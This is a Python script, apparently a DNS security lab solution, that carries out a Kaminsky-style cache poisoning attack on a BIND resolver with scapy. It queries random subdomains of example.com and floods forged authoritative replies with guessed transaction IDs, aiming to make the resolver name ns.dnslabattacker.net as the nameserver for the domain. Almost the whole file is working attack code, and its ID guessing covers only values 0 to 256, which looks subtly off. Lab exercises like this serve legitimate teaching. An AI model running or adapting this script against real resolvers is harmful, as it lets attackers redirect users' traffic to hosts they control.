#!/usr/bin/env python2
import argparse
import socket

from scapy.all import *
from random import randint, choice
from string import ascii_lowercase, digits
from subprocess import call
BUF_SIZE = 4096

parser = argparse.ArgumentParser()
parser.add_argument("--ip", help="ip address for your bind - do not use localhost", type=str, required=True)
parser.add_argument("--port", help="port for your bind - listen-on port parameter in named.conf", type=int, required=True)
parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries", type=int, required=False)
parser.add_argument("--query_port", help="port from where your bind sends DNS queries - query-source port parameter in named.conf", type=int, required=True)
args = parser.parse_args()

# your bind's ip address
my_ip = args.ip
# your bind's port (DNS queries are send to this port)
my_port = args.port
# BIND's port
dns_port = args.dns_port
# port that your bind uses to send its DNS queries
my_query_port = args.query_port

'''
Generates random strings of length 10.
'''
def getRandomSubDomain():
	return ''.join(choice(ascii_lowercase + digits) for _ in range (10))

'''
Generates random 8-bit integer.
'''
def getRandomTXID():
	return randint(0, 256)

'''
Sends a UDP packet.
'''
def sendPacket(sock, packet, ip, port):
    sock.sendto(str(packet), (ip, port))

'''
Example code that sends a DNS query using scapy.
'''
def exampleSendDNSQuery():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    dnsPacket = DNS(rd=1, qd=DNSQR(qname='example.com'))
    sendPacket(sock, dnsPacket, my_ip, my_port)
    response = sock.recv(4096)
    response = DNS(response)
    print "\n***** Packet Received from Remote Server *****"
    print response.show()
    print "***** End of Remote Server Packet *****\n"

# Function to attack
def cachePoison(): 
    # code that sends a DNS query using scapy
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    dnsPacket = DNS(rd=1, qd=DNSQR(qname='example.com'))
    sendPacket(sock, dnsPacket, my_ip, my_port)
    response = DNS(sock.recv(BUF_SIZE))

    # fake a query and response
    fakeQuery = dnsPacket
    fakeResponse = response
    fakeResponse.arcount = 0
    fakeResponse.aa = 1
    fakeResponse.nscount = 1
    fakeResponse.ar = None
    fakeResponse.ns.rdata = "ns.dnslabattacker.net"
    fakeResponse.ns.rrname = "example.com"

    while True:
        fakeName = getRandomSubDomain() 
        fakeQuery[DNS].qd.qname = fakeName + ".example.com"
        fakeResponse[DNS].an.rrname = fakeName + ".example.com"
        fakeResponse[DNS].qd.qname = fakeName + ".example.com"
        sendPacket(sock, fakeQuery, my_ip, my_port)

        for i in range(100):
            fakeResponse.id = getRandomTXID()
            sendPacket(sock, fakeResponse, my_ip, my_query_port)

        dnsPacket.qd.qname = "example.com"
        sendPacket(sock, dnsPacket, my_ip, my_port) 
        response = DNS(sock.recv(BUF_SIZE))
        
        if (response[DNS].ns[DNSRR].rdata == "ns.dnslabattacker.net.") & (response != None):
            print("Success!") 
            break

        print("Failed :(. Trying again...")

if __name__ == '__main__':
    cachePoison()
